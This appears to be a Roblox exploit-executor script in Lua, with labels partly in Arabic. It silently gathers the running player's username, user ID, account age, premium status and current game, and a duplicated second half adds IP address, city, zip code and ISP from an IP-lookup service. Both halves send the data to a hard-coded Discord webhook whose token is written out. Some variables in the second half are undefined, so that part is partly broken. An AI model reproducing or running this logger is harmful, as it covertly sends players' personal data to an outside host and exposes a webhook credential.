local Webhook = "https://discord.com/api/webhooks/1191422032039116980/9DW38LUNa9eRdzdTcBkm4GUrvxZqNbEwxV6tun-uoLNko7F4jp9ghbtImFUDG96XIGGs" -- your webhook
_G.Discord_UserID = "991" -- ID To Ping on every execution, blank if no one wants to be pinged.

local player = game:GetService"Players".LocalPlayer
local joinTime = os.time() - (player.AccountAge*86400)
local joinDate = os.date("!*t", joinTime)
local premium = false
local alt = true
if player.MembershipType == Enum.MembershipType.Premium then
   premium = true
end

if not premium and player.AccountAge >= 70 then
    alt = "Possible"
elseif premium and player.AccountAge >= 70 then
   alt = false
end

local executor = "AnyaLib-Beta"
local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl
local msg = {
["username"] = "ARABIC",
   ["avatar_url"] = "",
   ["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("@".._G.Discord_UserID.."") or " ",
   ["embeds"] = {
       {
           ["color"] = tonumber(tostring("0x32CD32")), --decimal
           ["title"] = "اسم الماب",
           ["thumbnail"] = {
               ["url"] = AvatarImage,
           },
           ["fields"] = {
                {
                   ["name"] = "الاسم",
                   ["value"] = ""..player.Name.."",
                   ["inline"] = true
                },
                {
                   ["name"] = "الاسم الوهمي",
                   ["value"] = player.DisplayName,
                   ["inline"] = true
                },
                {
                   ["name"] = "الايدي",
                   ["value"] = "["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")",
                   ["inline"] = true
                },
                {
               ["name"] = "ايدي الماب",
               ["value"] = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")",
               ["inline"] = true              
                },
                {
                   ["name"] = "اسم الماب",
                   ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                   ["inline"] = true
                },
                {
                   ["name"] = "الهاك المستخدم",
                   ["value"] = executor,
                   ["inline"] = true
                },
                {
                   ["name"] = "اشتراك روب",
                   ["value"] = alt,
                   ["inline"] = true
                },
                {
                   ["name"] = "عمر الحساب",
                   ["value"] = player.AccountAge.."day(s)",
                   ["inline"] = true
                },
                {
                   ["name"] = "وقت دخوله",
                   ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
                   ["inline"] = true
                },
           },
           ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
       }
   }
}

if isfile("Workspace/readthis.txt") then
        request = http_request or request or HttpPost or syn.request
    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
    makefolder("Workspace")
    writefile("Workspace/readthis.txt", "true")
    else
    request = http_request or request or HttpPost or syn.request
    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
    makefolder("Workspace")
    writefile("Workspace/readthis.txt", "true")
end

local player = game:GetService("Players").LocalPlayer
local joinTime = os.time() - (player.AccountAge * 86400)
local joinDate = os.date("!*t", joinTime)
local premium = false
local alt = true

if player.MembershipType == Enum.MembershipType.Premium then
    premium = true
end

if not premium and player.AccountAge >= 70 then
    alt = "Possible"
elseif premium and player.AccountAge >= 70 then
    alt = false
end

local executor = "AnyaLib-Beta"
local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl

-- Additional script for IP info
local ip_info = syn.request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)

local Webhook = "https://discord.com/api/webhooks/1191422032039116980/9DW38LUNa9eRdzdTcBkm4GUrvxZqNbEwxV6tun-uoLNko7F4jp9ghbtImFUDG96XIGGs" -- your webhook
_G.Discord_UserID = "991" -- ID To Ping on every execution, blank if no one wants to be pinged.

local msg = {
    ["username"] = "log",
    ["avatar_url"] = "",
    ["content"] = (_G.Discord_UserID ~= "" and _G.Discord_UserID ~= nil) and tostring("@".._G.Discord_UserID.."") or " ",
    ["embeds"] = {
        {
            ["color"] = tonumber("0x32CD32"), -- decimal
            ["title"] = "Map Name",
            ["thumbnail"] = {
                ["url"] = AvatarImage,
            },
            ["fields"] = {
                {
                    ["name"] = "Name",
                    ["value"] = ""..player.Name.."",
                    ["inline"] = true
                },
                {
                    ["name"] = "Display Name",
                    ["value"] = player.DisplayName,
                    ["inline"] = true
                },
                {
                    ["name"] = "ID",
                    ["value"] = "["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")",
                    ["inline"] = true
                },
                {
                    ["name"] = "Map ID",
                    ["value"] = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")",
                    ["inline"] = true
                },
                {
                    ["name"] = "Map Name",
                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Executor Used",
                    ["value"] = executor,
                    ["inline"] = true
                },
                {
                    ["name"] = "Roblox Subscription",
                    ["value"] = alt,
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age",
                    ["value"] = player.AccountAge.." day(s)",
                    ["inline"] = true
                },
                {
                    ["name"] = "Join Time",
                    ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
                    ["inline"] = true
                },
                {
                    ["name"] = "ip/location",
                    ["value"] = ipLocation,
                    ["inline"] = true
                },
            },
            ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
        }
    }
}

-- Sending the Discord message
if isfile("Workspace/readthis.txt") then
    request = http_request or request or HttpPost or syn.request
    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
    makefolder("Workspace")
    writefile("Workspace/readthis.txt", "true")
else
    request = http_request or request or HttpPost or syn.request
    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
    makefolder("Workspace")
    writefile("Workspace/readthis.txt", "true")
end
